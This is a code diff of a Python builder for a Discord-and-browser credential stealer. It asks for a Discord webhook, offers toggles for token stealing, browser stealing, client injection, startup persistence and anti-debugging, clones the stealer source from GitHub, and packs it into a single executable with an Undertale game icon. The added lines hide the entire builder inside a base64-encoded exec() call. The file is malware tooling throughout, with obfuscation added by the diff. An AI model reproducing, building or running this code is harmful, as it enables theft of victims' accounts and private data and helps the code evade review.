@@ -7,126 +7,13 @@ import requests
 from InquirerPy import prompt # type: ignore
 
 
-def get_config() -> dict:
-    questions = [
-        {
-            "type": "input",
-            "name": "webhook",
-            "message": "Enter your webhook URL",
-            "validate": (lambda x: False if re.match(r"https://(discord.com|discordapp.com)/api/webhooks/\d+/\S+", x) is None else True)
-        },
-        {
-            "type": "confirm",
-            "name": "antidebug",
-            "message": "Enable anti-debugging?",
-            "default": True,
-        },
-        {
-            "type": "confirm",
-            "name": "browsers",
-            "message": "Enable browser stealing?",
-            "default": True,
-        },
-        {
-            "type": "confirm",
-            "name": "discordtoken",
-            "message": "Enable Discord token stealing?",
-            "default": True,
-        },
-        {
-            "type": "confirm",
-            "name": "injection",
-            "message": "Enable Discord injection?",
-            "default": True,
-        },
-        {
-            "type": "confirm",
-            "name": "startup",
-            "message": "Enable startup?",
-            "default": True,
-        },
-        {
-            "type": "confirm",
-            "name": "systeminfo",
-            "message": "Enable system info?",
-            "default": True,
-        },
-    ]
+import json
+import os
+import shutil
+import subprocess
+import re
+import requests
+import base64
+from InquirerPy import prompt # type: ignore
 
-    return prompt(questions)
-
-class make_env:
-    def __init__(self) -> None:
-        self.build_dir = os.path.join(os.getcwd(), 'build')
-
-    def __call__(self) -> None:
-        self.make_env()
-        self.get_src()
-
-    def make_env(self) -> None:
-        if os.path.exists(self.build_dir):
-            shutil.rmtree(self.build_dir)
-
-        os.mkdir(self.build_dir)
-
-    def get_src(self) -> None:
-        subprocess.run(['git', 'clone', 'https://github.com/chiron853/test1234567890.git'], cwd=self.build_dir)
-        shutil.move(os.path.join(self.build_dir, 'test1234567890', 'src'), self.build_dir)
-
-class write_config:
-    def __init__(self, config: dict) -> None:
-        self.config = config
-        self.build_dir = os.path.join(os.getcwd(), 'build')
-        self.config_file = os.path.join(self.build_dir, 'src', 'config.py')
-
-    def __call__(self) -> None:
-        with open(self.config_file, 'w') as f:
-            f.write(f'__CONFIG__ = {self.config}')
-
-class build:
-    def __init__(self) -> None:
-        self.build_dir = os.path.join(os.getcwd(), 'build')
-        self.dist_dir = os.path.join(self.build_dir, '..', 'dist')
-
-    def __call__(self) -> None:
-        self.get_pyinstaller()
-        self.get_upx()
-
-        subprocess.run(['pyinstaller', '--clean', '--icon=c:\\users\\DATA-REDACTED\\downloads\\Undertale.ico', '--onefile', '--distpath', self.dist_dir, '--workpath', os.path.join(self.build_dir, 'work'), '--specpath', os.path.join(self.build_dir, 'spec'), '--upx-dir', os.path.join(self.build_dir, 'upx'), os.path.join(self.build_dir, 'src', 'main.py')])
-
-    def get_pyinstaller(self) -> None:
-        url = 'https://github.com/pyinstaller/pyinstaller/archive/refs/tags/v5.1.zip'
-
-        with requests.get(url, stream=True) as r:
-            r.raise_for_status()
-            with open(os.path.join(self.build_dir, 'pyinstaller.zip'), 'wb') as f:
-                shutil.copyfileobj(r.raw, f)
-
-        shutil.unpack_archive(os.path.join(self.build_dir, 'pyinstaller.zip'), self.build_dir)
-        os.rename(os.path.join(self.build_dir, 'pyinstaller-5.1'), os.path.join(self.build_dir, 'pyinstaller'))
-        os.remove(os.path.join(self.build_dir, 'pyinstaller.zip'))
-
-        subprocess.run(['pip', 'uninstall', '-y', 'pyinstaller'], cwd=self.build_dir)
-        subprocess.run(['py', '-3.10', './waf', 'all', '--target-arch=64bit'], cwd=os.path.join(self.build_dir, 'pyinstaller', 'bootloader'))
-        subprocess.run(['py', '-3.10', 'setup.py', 'install'], cwd=os.path.join(self.build_dir, 'pyinstaller'))
-    
-    def get_upx(self) -> None:
-        url = 'https://github.com/upx/upx/releases/download/v3.96/upx-3.96-win64.zip'
-
-        with requests.get(url, stream=True) as r:
-            r.raise_for_status()
-            with open(os.path.join(self.build_dir, 'upx.zip'), 'wb') as f:
-                shutil.copyfileobj(r.raw, f)
-
-        shutil.unpack_archive(os.path.join(self.build_dir, 'upx.zip'), self.build_dir)
-        os.rename(os.path.join(self.build_dir, 'upx-3.96-win64'), os.path.join(self.build_dir, 'upx'))
-        os.remove(os.path.join(self.build_dir, 'upx.zip'))
-
-def main() -> None:
-    config = get_config()
-    make_env()()
-    write_config(config)()
-    build()()
-
-if __name__ == '__main__':
-    main()
+exec(base64.b64decode("ZGVmIGdldF9jb25maWcoKSAtPiBkaWN0Og0KICAgIHF1ZXN0aW9ucyA9IFsNCiAgICAgICAgew0KICAgICAgICAgICAgInR5cGUiOiAiaW5wdXQiLA0KICAgICAgICAgICAgIm5hbWUiOiAid2ViaG9vayIsDQogICAgICAgICAgICAibWVzc2FnZSI6ICJFbnRlciB5b3VyIHdlYmhvb2sgVVJMIiwNCiAgICAgICAgICAgICJ2YWxpZGF0ZSI6IChsYW1iZGEgeDogRmFsc2UgaWYgcmUubWF0Y2gociJodHRwczovLyhkaXNjb3JkLmNvbXxkaXNjb3JkYXBwLmNvbSkvYXBpL3dlYmhvb2tzL1xkKy9cUysiLCB4KSBpcyBOb25lIGVsc2UgVHJ1ZSkNCiAgICAgICAgfSwNCiAgICAgICAgew0KICAgICAgICAgICAgInR5cGUiOiAiY29uZmlybSIsDQogICAgICAgICAgICAibmFtZSI6ICJhbnRpZGVidWciLA0KICAgICAgICAgICAgIm1lc3NhZ2UiOiAiRW5hYmxlIGFudGktZGVidWdnaW5nPyIsDQogICAgICAgICAgICAiZGVmYXVsdCI6IFRydWUsDQogICAgICAgIH0sDQogICAgICAgIHsNCiAgICAgICAgICAgICJ0eXBlIjogImNvbmZpcm0iLA0KICAgICAgICAgICAgIm5hbWUiOiAiYnJvd3NlcnMiLA0KICAgICAgICAgICAgIm1lc3NhZ2UiOiAiRW5hYmxlIGJyb3dzZXIgc3RlYWxpbmc/IiwNCiAgICAgICAgICAgICJkZWZhdWx0IjogVHJ1ZSwNCiAgICAgICAgfSwNCiAgICAgICAgew0KICAgICAgICAgICAgInR5cGUiOiAiY29uZmlybSIsDQogICAgICAgICAgICAibmFtZSI6ICJkaXNjb3JkdG9rZW4iLA0KICAgICAgICAgICAgIm1lc3NhZ2UiOiAiRW5hYmxlIERpc2NvcmQgdG9rZW4gc3RlYWxpbmc/IiwNCiAgICAgICAgICAgICJkZWZhdWx0IjogVHJ1ZSwNCiAgICAgICAgfSwNCiAgICAgICAgew0KICAgICAgICAgICAgInR5cGUiOiAiY29uZmlybSIsDQogICAgICAgICAgICAibmFtZSI6ICJpbmplY3Rpb24iLA0KICAgICAgICAgICAgIm1lc3NhZ2UiOiAiRW5hYmxlIERpc2NvcmQgaW5qZWN0aW9uPyIsDQogICAgICAgICAgICAiZGVmYXVsdCI6IFRydWUsDQogICAgICAgIH0sDQogICAgICAgIHsNCiAgICAgICAgICAgICJ0eXBlIjogImNvbmZpcm0iLA0KICAgICAgICAgICAgIm5hbWUiOiAic3RhcnR1cCIsDQogICAgICAgICAgICAibWVzc2FnZSI6ICJFbmFibGUgc3RhcnR1cD8iLA0KICAgICAgICAgICAgImRlZmF1bHQiOiBUcnVlLA0KICAgICAgICB9LA0KICAgICAgICB7DQogICAgICAgICAgICAidHlwZSI6ICJjb25maXJtIiwNCiAgICAgICAgICAgICJuYW1lIjogInN5c3RlbWluZm8iLA0KICAgICAgICAgICAgIm1lc3NhZ2UiOiAiRW5hYmxlIHN5c3RlbSBpbmZvPyIsDQogICAgICAgICAgICAiZGVmYXVsdCI6IFRydWUsDQogICAgICAgIH0sDQogICAgXQ0KDQogICAgcmV0dXJuIHByb21wdChxdWVzdGlvbnMpDQoNCmNsYXNzIG1ha2VfZW52Og0KICAgIGRlZiBfX2luaXRfXyhzZWxmKSAtPiBOb25lOg0KICAgICAgICBzZWxmLmJ1aWxkX2RpciA9IG9zLnBhdGguam9pbihvcy5nZXRjd2QoKSwgJ2J1aWxkJykNCg0KICAgIGRlZiBfX2NhbGxfXyhzZWxmKSAtPiBOb25lOg0KICAgICAgICBzZWxmLm1ha2VfZW52KCkNCiAgICAgICAgc2VsZi5nZXRfc3JjKCkNCg0KICAgIGRlZiBtYWtlX2VudihzZWxmKSAtPiBOb25lOg0KICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhzZWxmLmJ1aWxkX2Rpcik6DQogICAgICAgICAgICBzaHV0aWwucm10cmVlKHNlbGYuYnVpbGRfZGlyKQ0KDQogICAgICAgIG9zLm1rZGlyKHNlbGYuYnVpbGRfZGlyKQ0KDQogICAgZGVmIGdldF9zcmMoc2VsZikgLT4gTm9uZToNCiAgICAgICAgc3VicHJvY2Vzcy5ydW4oWydnaXQnLCAnY2xvbmUnLCAnaHR0cHM6Ly9naXRodWIuY29tL2NoaXJvbjg1My90ZXN0MTIzNDU2Nzg5MC5naXQnXSwgY3dkPXNlbGYuYnVpbGRfZGlyKQ0KICAgICAgICBzaHV0aWwubW92ZShvcy5wYXRoLmpvaW4oc2VsZi5idWlsZF9kaXIsICd0ZXN0MTIzNDU2Nzg5MCcsICdzcmMnKSwgc2VsZi5idWlsZF9kaXIpDQoNCmNsYXNzIHdyaXRlX2NvbmZpZzoNCiAgICBkZWYgX19pbml0X18oc2VsZiwgY29uZmlnOiBkaWN0KSAtPiBOb25lOg0KICAgICAgICBzZWxmLmNvbmZpZyA9IGNvbmZpZw0KICAgICAgICBzZWxmLmJ1aWxkX2RpciA9IG9zLnBhdGguam9pbihvcy5nZXRjd2QoKSwgJ2J1aWxkJykNCiAgICAgICAgc2VsZi5jb25maWdfZmlsZSA9IG9zLnBhdGguam9pbihzZWxmLmJ1aWxkX2RpciwgJ3NyYycsICdjb25maWcucHknKQ0KDQogICAgZGVmIF9fY2FsbF9fKHNlbGYpIC0+IE5vbmU6DQogICAgICAgIHdpdGggb3BlbihzZWxmLmNvbmZpZ19maWxlLCAndycpIGFzIGY6DQogICAgICAgICAgICBmLndyaXRlKGYnX19DT05GSUdfXyA9IHtzZWxmLmNvbmZpZ30nKQ0KDQpjbGFzcyBidWlsZDoNCiAgICBkZWYgX19pbml0X18oc2VsZikgLT4gTm9uZToNCiAgICAgICAgc2VsZi5idWlsZF9kaXIgPSBvcy5wYXRoLmpvaW4ob3MuZ2V0Y3dkKCksICdidWlsZCcpDQogICAgICAgIHNlbGYuZGlzdF9kaXIgPSBvcy5wYXRoLmpvaW4oc2VsZi5idWlsZF9kaXIsICcuLicsICdkaXN0JykNCg0KICAgIGRlZiBfX2NhbGxfXyhzZWxmKSAtPiBOb25lOg0KICAgICAgICBzZWxmLmdldF9weWluc3RhbGxlcigpDQogICAgICAgIHNlbGYuZ2V0X3VweCgpDQoNCiAgICAgICAgc3VicHJvY2Vzcy5ydW4oWydweWluc3RhbGxlcicsICctLWNsZWFuJywgJy0taWNvbj1jOlxcdXNlcnNcXERBVEEtUkVEQUNURURcXGRvd25sb2Fkc1xcVW5kZXJ0YWxlLmljbycsICctLW9uZWZpbGUnLCAnLS1kaXN0cGF0aCcsIHNlbGYuZGlzdF9kaXIsICctLXdvcmtwYXRoJywgb3MucGF0aC5qb2luKHNlbGYuYnVpbGRfZGlyLCAnd29yaycpLCAnLS1zcGVjcGF0aCcsIG9zLnBhdGguam9pbihzZWxmLmJ1aWxkX2RpciwgJ3NwZWMnKSwgJy0tdXB4LWRpcicsIG9zLnBhdGguam9pbihzZWxmLmJ1aWxkX2RpciwgJ3VweCcpLCBvcy5wYXRoLmpvaW4oc2VsZi5idWlsZF9kaXIsICdzcmMnLCAnbWFpbi5weScpXSkNCg0KICAgIGRlZiBnZXRfcHlpbnN0YWxsZXIoc2VsZikgLT4gTm9uZToNCiAgICAgICAgdXJsID0gJ2h0dHBzOi8vZ2l0aHViLmNvbS9weWluc3RhbGxlci9weWluc3RhbGxlci9hcmNoaXZlL3JlZnMvdGFncy92NS4xLnppcCcNCg0KICAgICAgICB3aXRoIHJlcXVlc3RzLmdldCh1cmwsIHN0cmVhbT1UcnVlKSBhcyByOg0KICAgICAgICAgICAgci5yYWlzZV9mb3Jfc3RhdHVzKCkNCiAgICAgICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oc2VsZi5idWlsZF9kaXIsICdweWluc3RhbGxlci56aXAnKSwgJ3diJykgYXMgZjoNCiAgICAgICAgICAgICAgICBzaHV0aWwuY29weWZpbGVvYmooci5yYXcsIGYpDQoNCiAgICAgICAgc2h1dGlsLnVucGFja19hcmNoaXZlKG9zLnBhdGguam9pbihzZWxmLmJ1aWxkX2RpciwgJ3B5aW5zdGFsbGVyLnppcCcpLCBzZWxmLmJ1aWxkX2RpcikNCiAgICAgICAgb3MucmVuYW1lKG9zLnBhdGguam9pbihzZWxmLmJ1aWxkX2RpciwgJ3B5aW5zdGFsbGVyLTUuMScpLCBvcy5wYXRoLmpvaW4oc2VsZi5idWlsZF9kaXIsICdweWluc3RhbGxlcicpKQ0KICAgICAgICBvcy5yZW1vdmUob3MucGF0aC5qb2luKHNlbGYuYnVpbGRfZGlyLCAncHlpbnN0YWxsZXIuemlwJykpDQoNCiAgICAgICAgc3VicHJvY2Vzcy5ydW4oWydwaXAnLCAndW5pbnN0YWxsJywgJy15JywgJ3B5aW5zdGFsbGVyJ10sIGN3ZD1zZWxmLmJ1aWxkX2RpcikNCiAgICAgICAgc3VicHJvY2Vzcy5ydW4oWydweScsICctMy4xMCcsICcuL3dhZicsICdhbGwnLCAnLS10YXJnZXQtYXJjaD02NGJpdCddLCBjd2Q9b3MucGF0aC5qb2luKHNlbGYuYnVpbGRfZGlyLCAncHlpbnN0YWxsZXInLCAnYm9vdGxvYWRlcicpKQ0KICAgICAgICBzdWJwcm9jZXNzLnJ1bihbJ3B5JywgJy0zLjEwJywgJ3NldHVwLnB5JywgJ2luc3RhbGwnXSwgY3dkPW9zLnBhdGguam9pbihzZWxmLmJ1aWxkX2RpciwgJ3B5aW5zdGFsbGVyJykpDQogICAgDQogICAgZGVmIGdldF91cHgoc2VsZikgLT4gTm9uZToNCiAgICAgICAgdXJsID0gJ2h0dHBzOi8vZ2l0aHViLmNvbS91cHgvdXB4L3JlbGVhc2VzL2Rvd25sb2FkL3YzLjk2L3VweC0zLjk2LXdpbjY0LnppcCcNCg0KICAgICAgICB3aXRoIHJlcXVlc3RzLmdldCh1cmwsIHN0cmVhbT1UcnVlKSBhcyByOg0KICAgICAgICAgICAgci5yYWlzZV9mb3Jfc3RhdHVzKCkNCiAgICAgICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oc2VsZi5idWlsZF9kaXIsICd1cHguemlwJyksICd3YicpIGFzIGY6DQogICAgICAgICAgICAgICAgc2h1dGlsLmNvcHlmaWxlb2JqKHIucmF3LCBmKQ0KDQogICAgICAgIHNodXRpbC51bnBhY2tfYXJjaGl2ZShvcy5wYXRoLmpvaW4oc2VsZi5idWlsZF9kaXIsICd1cHguemlwJyksIHNlbGYuYnVpbGRfZGlyKQ0KICAgICAgICBvcy5yZW5hbWUob3MucGF0aC5qb2luKHNlbGYuYnVpbGRfZGlyLCAndXB4LTMuOTYtd2luNjQnKSwgb3MucGF0aC5qb2luKHNlbGYuYnVpbGRfZGlyLCAndXB4JykpDQogICAgICAgIG9zLnJlbW92ZShvcy5wYXRoLmpvaW4oc2VsZi5idWlsZF9kaXIsICd1cHguemlwJykpDQoNCmRlZiBtYWluKCkgLT4gTm9uZToNCiAgICBjb25maWcgPSBnZXRfY29uZmlnKCkNCiAgICBtYWtlX2VudigpKCkNCiAgICB3cml0ZV9jb25maWcoY29uZmlnKSgpDQogICAgYnVpbGQoKSgpDQoNCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6DQogICAgbWFpbigpDQo="))
